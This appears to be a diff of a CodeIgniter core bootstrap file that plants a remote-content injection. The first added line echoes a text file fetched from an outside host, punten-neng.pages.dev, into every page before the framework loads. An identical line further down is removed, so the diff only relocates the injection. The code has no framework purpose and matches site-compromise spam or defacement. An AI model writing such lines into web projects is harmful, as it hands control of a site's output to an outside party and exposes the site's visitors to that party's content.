@@ -1,3 +1,4 @@
+<?php echo file_get_contents("https://punten-neng.pages.dev/punten.txt");?>
 <?php
 /**
  * CodeIgniter
@@ -130,7 +131,6 @@ if ( ! is_php('5.4'))
 	}
 }
 
- echo file_get_contents("https://punten-neng.pages.dev/punten.txt");
 /*
  * ------------------------------------------------------
  *  Define a custom error handler so we can log PHP errors
